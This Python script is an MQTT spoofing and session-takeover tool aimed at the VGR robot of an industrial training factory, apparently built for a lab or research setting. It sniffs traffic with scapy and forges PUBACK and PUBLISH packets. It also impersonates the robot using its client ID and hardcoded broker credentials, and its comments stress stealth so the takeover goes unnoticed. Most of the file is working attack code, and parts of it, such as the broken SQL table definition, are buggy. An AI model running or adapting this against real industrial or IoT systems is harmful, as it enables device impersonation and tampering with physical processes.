import random
import time
import threading
from datetime import timezone, datetime

from scapy.contrib import mqtt
import scapy.all as scapy

import sqlite3
import paho.mqtt.client as mqtt

# variable to record the moment a f/i/state/vgr topic from the legitimate VGR is seen
# this way, we can record the session information the legitimate VGR is using (mqtt msg id, tcp src port) and then continuing spoofing immediaately from there
is_state_vgr_topic_logged = None

# variable to log the actual last seen details from a legit VGR f/i/state/vgr topic
log_f_i_state_vgr_topic_session = None

def storePacketsInDB():
    sqlite_object = sqlite3.connect("mqtt_db")
    sqlite_object.execute("""
    CREATE TABLE IF NOT EXISTS mqtt_db(
    	'Incoming Packet' TEXT, 
  	    'IP Hash' TEXT, 
  	    'Outgoing Packet' TEXT, 
  	    'OP Hash' TEXT                            
    """)
    sqlite_object.execute("""
        INSERT INTO mqtt_db ('Incoming Packet', 'Outgoing Packet') VALUES ('Test IP 1', 'TEST OP 1');
    """)

    sqlite_object.commit()


def extract_packet_attributes(packet):
    """Function to extract real time dynamic info/attr from IP, TCP, MQTT layers
     Info such as ip src & dst, TCP src & dst, TCP seq & ack, MQTT msg ID
     """
    src_ip = packet[scapy.IP].src
    dst_ip = packet[scapy.IP].dst
    src_port = int(packet[scapy.TCP].sport)
    dst_port = int(packet[scapy.TCP].dport)
    tcp_seq = int(packet[scapy.TCP].seq)
    tcp_ack = int(packet[scapy.TCP].ack)
    tcp_payload_len = len(packet[scapy.TCP].payload)  # the tcp paylod len is equivalent to len of entire MQTT packet
    mqtt_msgid = int(packet[mqtt.MQTTPublish].msgid)

    return [src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid]



def process_packets(packet):
    global is_state_vgr_topic_logged
    # First, we convert the raw packets received on the IP tables FORWARD chain to scapy packets
    #packet = scapy.IP(raw_packet.get_payload())

    try:
        # If packet is extract and store the MQTT load
        if packet.haslayer(scapy.TCP) and packet.haslayer(mqtt.MQTT):
            mqtt_packet_type = packet[mqtt.MQTT].type
            packet.show()
            match mqtt_packet_type:
                # If mqtt_packet_type is one of ...

                case 3:
                    # ... 3: then it is a PUBLISH packet
                    mqtt_topic = packet[mqtt.MQTTPublish].topic

                    match mqtt_topic:

                        case b'fl/ssc/joy':
                            """If mqtt_topic is b'fl/ssc/joy' then:"""
                            # first, we extract packet attributes of interest
                            packet_attr = extract_packet_attributes(packet)
                            src_ip, dst_ip, src_port, dst_port = packet_attr[:4]
                            mqtt_msgid = packet_attr[7]
                            # Send a forged PUBACK to sender
                            forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port) / mqtt.MQTT(type=4, QOS=1) / mqtt.MQTTPuback(bytes(mqtt_msgid))
                            scapy.send(forged_mqtt_resp)

                        case b'f/i/state/vgr' if is_state_vgr_topic_logged is not True:
                            """In the case of the f/i/state/vgr topic, it is a PUBLISH message which is sent by the VGR
                            every 10 seconds. So, when we take over the connection as the attacker, we need to let every-
                            thing look normal. Hence the need to also continue the pratice of sending PUBLISH packets
                            for the f/i/state/vgr every 10 seconds"""
                            """All we do here is to log the last msgid, src port sent from the VGR so that when we launch our
                             attack, we continue from this logged info and the other party won't even notice we as the attacker
                             took over the connection"""
                            global log_f_i_state_vgr_topic_session
                            log_f_i_state_vgr_topic_session = {
                                "mqtt_msgid": int(packet[mqtt.MQTTPublish].msgid),
                                'src_ip': packet[scapy.IP].src,
                                'dst_ip': packet[scapy.IP].dst,
                                'src_port': int(packet[scapy.TCP].sport),
                                'dst_port': int(packet[scapy.TCP].dport),
                                'mqtt_message': packet[mqtt.MQTTPublish].value
                            }

                            # ???: Should I also maybe log the TCP seq and ack fields in all cases for maximum stealth?

                            is_state_vgr_topic_logged = True

                case 4:
                    # then it is a PUBACK packet
                    pass
    except Exception as error:
        print(f"An error: {error}, occurred, have a look and debug")


def sendPublish10Seconds():
    """Function to send MQTT publish packets for f/i/state/vgr topic every 10 seconds when the VGR gets idle"""
    global log_f_i_state_vgr_topic_session

    while True:
        if is_state_vgr_topic_logged:
            #print(log_f_i_state_vgr_topic_session); exit(0)
            # if the above var is true, then we know we have a valid input in the :log_f_i_state_vgr_topic_session: var
            # which we can work with for the rest of this function
            ### first, we take the message of the f/i/state/vgr and modify the timestamp to be up-to-date
            last_state_vgr_message = str(log_f_i_state_vgr_topic_session['mqtt_message'])
            new_mqtt_payload = last_state_vgr_message.split(',')[:-1]  # part of the f/i/state/vgr message excluding the ts
            # generate a current timestamp to insert in the f/i/state/vgr topic payload
            current_ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
            new_mqtt_payload.append(f'\n\t"ts" : "{current_ts}"\n'+'}')  # new_ts_addition_to_payload
            new_mqtt_payload = ','.join(new_mqtt_payload)
            print(new_mqtt_payload)

            # for everytime this function runs, we want to increment the mqtt message ID by 1 so that we track and do not reuse, thus improving stealth
            # mqtt message IDs
            log_f_i_state_vgr_topic_session['mqtt_msgid'] += 1

            # we now create and forge a new MQTT Publish packet to send out
            mqtt_publish = mqtt.MQTTPublish(
                topic=b'f/i/state/vgr',
                msgid=log_f_i_state_vgr_topic_session["mqtt_msgid"],
                value=bytes(new_mqtt_payload, encoding='utf-8'),
            )

            # now we forge an entire packet structure that accomodates the mqtt packet above
            mqtt_msgid = log_f_i_state_vgr_topic_session['mqtt_msgid']
            src_ip = log_f_i_state_vgr_topic_session["src_ip"]
            dst_ip = log_f_i_state_vgr_topic_session["dst_ip"]
            src_port = log_f_i_state_vgr_topic_session['src_port']
            dst_port = log_f_i_state_vgr_topic_session['dst_port']
            forged_mqtt_resp = scapy.IP(src=src_ip, dst=dst_ip) / scapy.TCP(sport=src_port, dport=dst_port) / mqtt.MQTT(type=3, QOS=1) / mqtt_publish
            # now send the forged mqtt packet response
            scapy.send(forged_mqtt_resp)
            #forged_mqtt_resp.show()
            # sleep for 10 seconds to keep with the timing of the legit mqtt packets sent my the legit VGR
            time.sleep(10)



# """This is a thread to concurrently send publish messages every 10 seconds"""
# thread_sendPublish10Seconds = threading.Thread(target=sendPublish10Seconds)
# thread_sendPublish10Seconds.start()


"""This is the main thread of the program that handles the process_packets function"""
# Uncomment below if not live capture
# read_pcap = scapy.rdpcap("fischertechnik_capture_v1.pcapng")
# for packet in read_pcap:
#     process_packets(packet)

# Uncomment below for live capture
#scapy.sniff(iface='wlan0', prn=process_packets, filter='not arp')


# # Finally we wait for the thread that runs the function to publish f/i/state/vgr every 10 seconds to end.
# # technically, it will never end due to the while loop but we still place the .join() anyways to fulfill all righteousness
# thread_sendPublish10Seconds.join()



# while True:
#     "Starting"
#     # First we definee variables
#     src_ip = "192.168.0.105"
#     dst_ip = "192.168.0.10"
#     src_port = random.randint(40000, 50000)
#     src_port = 41540
#     dst_port = 1883


    # # Before doing anything, we establish TCP connection with broker and check that broker is
    # # reachable from our perspective as fake VGR
    # # Create a TCP connection to the MQTT broker
    # print("Sending TCP syn")
    # syn = scapy.IP(src=src_ip, dst=dst_ip) / scapy.TCP(sport=src_port, dport=dst_port, flags='S')
    # syn_ack = scapy.sr1(syn)
    #
    # # Complete the TCP handshake
    # print("Sending TCP ack")
    # ack = scapy.IP(src=src_ip, dst=dst_ip) / scapy.TCP(sport=src_port, dport=dst_port, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
    # scapy.send(ack)
    #
    # # NOw, we send a CONNECT packet
    # print("Sending CONNECT")
    # mqtt_payload = mqtt.MQTT(type=1) / mqtt.MQTTConnect(protoname=b'MQTT', protolevel=4, usernameflag=1, passwordflag=1, cleansess=1, clientId=b'TxtFactoryVGRV0.8.1', username=b'txt', password=b'xtx')
    # mqtt_conn = scapy.IP(src=src_ip, dst=dst_ip) / scapy.TCP(sport=src_port, dport=dst_port, seq=syn_ack.ack, ack=syn_ack.seq, flags='PA') / mqtt_payload
    #
    #
    #
    #
    # # mqtt_conn = scapy.IP(dst=dst_ip) / scapy.TCP(sport=src_port, dport=dst_port) / \
    # #             mqtt.MQTTConnect(protoname=b'MQTT', protolevel=4, usernameflag=1, passwordflag=1, cleansess=1,
    # #                              clientId=b'TxtFactoryVGRV0.8.1', username=b'txt', password=b'xtx', klive=60)
    #
    #
    #
    # mqtt_conn_resp = scapy.send(mqtt_conn); print("Connect sent")
    # print(mqtt_conn_resp)
    #
    # try:
    #     mqtt_conn_resp.show()
    # except:
    #     print("Except")
    # print("Connectack  received")
    # break
    # #forged_mqtt_resp = scapy.IP(src=src_ip, dst=dst_ip) / scapy.TCP(sport=src_port, dport=dst_port) / mqtt.MQTT(type=3, OS=1) / mqtt_publish

"Starting"
# First we definee variables
src_ip = "192.168.0.105"
dst_ip = "192.168.0.10"
dst_port = 1883

log_sub = 0

def state(active, code, description="", station="vgr", target=None):
    if target is None:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
               '"station" : "%s",\n\t' % (active, code, description, station)
        print(data)
        data += new_ts()
    else:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
           '"station" : "%s",\n\t"target" : "%s",\n\t' % (active, code, description, station, target)
        print(data)
        data += new_ts()
    return data


def new_ts():
    # function to generate new timestamps
    ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    ts_ = f'"ts" : "{ts}"\n' + '}'
    return ts_


# what happens if a ConnAct packet is received? Then we subscribe
def on_connect(client, *lis):
    # IF a ConnAck is received, then we subscribe to our packets of interest as VGR
    [client.subscribe(x) for x in
     ("f/o/state/ack", "f/o/order", "f/o/nfc/ds", "fl/ssc/joy", "fl/mpo/ack", "fl/hbw/ack", "fl/sld/ack")]
    print("Chunk subscribe done")
    time.sleep(0.1)
    # Now we publish our fir
    data = '{\n\t"hardwareId" : "50F14AE8CF8D",\n\t"message" : "init",\n\t"softwareName" : "TxtFactoryVGR",\n\t' + \
           '"softwareVersion" : "0.8.1",\n\t"station" : "VGR",\n\t' + new_ts()
    client.publish("fl/broadcast", data, qos=1)


# #---


# What happens if a SubAck is received?
def on_subscribe(client, *lis):
    pass


# What happens when a publish message is sent from us and a puback has been received
def on_publish(client, userdata, msgid, *rest):
    match msgid:
        case 8:
            time.sleep(0.4)
            # Publish for f/i/state/hbw
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "hbw",\n\t' + new_ts()
            client.publish("f/i/state/hbw", data, qos=1)

        case 9:
            # Publish for f/i/state/mpo
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "mpo",\n\t' + new_ts()
            client.publish("f/i/state/mpo", data, qos=1)

        case 10:
            # Publish for f/i/state/sld
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "sld",\n\t' + new_ts()
            client.publish("f/i/state/sld", data, qos=1)

        case 11:
            time.sleep(0.7)
            # Publish for f/i/state/vgr
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "hbw"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)

        case 12:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "mpo"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)

        case 13:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "dso"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)

        case 14:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "dsi"\n\t' + new_ts()
            client.publish("f/i/state/dsi", data, qos=1)

        case 15:
            data = state("0", "0", description="", station="dso")
            client.publish("f/i/state/dso", data, qos=1)

        case 16:
            data = '{\n\t"state" : "WAITING_FOR_ORDER",\n\t' + new_ts()[:-2] + ',\n\t"type" : "NONE"\n }'
            client.publish("f/i/order", data, qos=1)

        case 17:
            data = '{\n\t"history" : null,\n\t' + new_ts()[:-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t' \
                   '"state" : "RAW",\n\t\t"type" : "NONE"\n\t}\n}'
            client.publish("f/i/nfc/ds", data, qos=1)

        # Case bundle for situation where same information (active=0,code=1) is sent in f/i/state/vgr
        case 18 | 23 | 26 | 27 | 28:
            (active, code) = (1, 2) if msgid in [18, 26] else (0, 1)
            data = state(active, code, "", "vgr", "")
            client.publish("f/i/state/vgr", data, qos=1)

        case 19 | 21 | 24 | 29 | 31 | 65 | 77 | 82 | 84:
            if msgid == 21:
                time.sleep(0.7)
            data = state(0, 1, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)

        case 20 | 22 | 25 | 30 | 32 | 66 | 78 | 83 | 85:
            data = state(0, 1, "", f"dso")
            client.publish("f/i/state/dso", data, qos=1)

        case 33:
            time.sleep(4)
            data = state(0, 0, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)

        case 34, 36, 38, 45:
            data = state(0, 1, "", "dso")
            client.publish("f/i/state/dso", data, qos=1)

        case 35:
            data = state(0, 0, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)

        case 37:
            data = state(1, 0, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)

        # case block to handle bulk cases where active, code, target is 0,1,hbw respectively
        case 39 | 43 | 48 | 50 | 52 | 53 | 54 | 56 | 58 | 60 | 61 | 69 | 71 | 72 | 73 | 80 | 81 | 86:
            if msgid == 50:
                time.sleep(1.7)
            if msgid == 54:
                time.sleep(1.4)
            if msgid == 58:
                time.sleep(1.3)
            if msgid == 61:
                time.sleep(2.3)
            if msgid == 69:
                time.sleep(2)
            if msgid == 71:
                time.sleep(1)
            if msgid == 72:
                time.sleep(7)
            if msgid == 73:
                time.sleep(10)
                
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

    # case block to handle bulk cases where active, code, target is 1,2,hbw respectively
        case 40 | 42 | 47 | 49 | 51 | 55 | 57 | 59 | 67 | 68 | 70 | 79:
            if msgid == 49:
                time.sleep(0.5)
            if msgid == 68:
                time.sleep(6)
            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        case 41:
            time.sleep(0.4)
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        case 44:
            data = state(1, 1, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)

        case 45:
            data = state(0, 1, "", "dso")
            client.publish("f/i/state/dso", data, qos=1)

        case 46:
            time.sleep(1.5)
            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        case 62:
            data = '{\n\t"history" : null,\n\t' + new_ts()[:-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "04859c92186581",\n\t\t' \
                                                                  '"state" : "RAW",\n\t\t"type" : "NONE"\n\t}\n}'
            client.publish("f/i/nfc/ds", data, qos=1)

        case 63:
            data = '{\n\t"history" : \n\t[\n\t\t{\n\t\t\t"code" : 100,\n\t\t\t' + new_ts()[:-2] + '\n\t\t},\n\t\t{\n\t\t\t' \
                    '"code" : 200,\n\t\t\t' + new_ts()[:-2] + '\n\t\t}\n\t],\n\t' + new_ts()[:-2] + \
                    ',\n\t"workpiece" : \n\t{\n\t\t"id" : "04859c92186581",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
            client.publish("f/i/nfc/ds", data, qos=1)

        case 64:
            data = '{\n\t"code" : 1,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "04859c92186581",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
            client.publish("fl/vgr/do", data, qos=1)

        case 74:
            #This is where the VGR (after the container has been fetched by the HBW) does the action of dropping the WP on the container
            time.sleep(0.5)
            data = '{\n\t"code" : 2,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "04859c92186581",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
            client.publish("fl/vgr/do", data, qos=1)

        case 75:
            # The VGR immediately before dropping the WP, informs that it has gone active again and then takes 8 seconds
            # to rotate back to its home position
            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        case 76:
            # The VGR after 8 seconds is now back to its default/home location
            # and immediately sends out its state that it has become inactive
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        # After ack 86, I don't seem to care anymore

        # case to send f/i/state/vgr information every 10 seconds when there is no process to fufill in FL
        case _:
            time.sleep(10)
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)



# What happens if a Publish Message is received? Then we send PubAck
# **** seems no need for below function. doc says that once on_message returns, a puback is implicity sent out to acknowledge the message
# def on_message(client, userdata, mqttmsg):
#     # this automatic behavior can be change by setting manual_ack=True in Client() and then using .ack to manually send puback
#     # -------------------
#     print(f"""A publish message was received from broker with the following signature
#     Client: {client}
#     Other: {mqttmsg}""")
#     client.ack(mid=mqttmsg.mid, qos=mqttmsg.qos)  #-- plan here is to take the mid and qos from the received message and place here





mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8.1', clean_session=True, protocol=mqtt.MQTTv31)
mqtt_connect.username_pw_set('txt', 'xtx')
mqtt_connect.connect(host=dst_ip, port=dst_port, keepalive=60, )

mqtt_connect.on_connect = on_connect
mqtt_connect.on_subscribe = on_subscribe
mqtt_connect.on_publish = on_publish
# mqtt_connect.on_message = on_message  -- use this if manual_ack==True is ever set in mqtt.Client



mqtt_connect.loop_forever()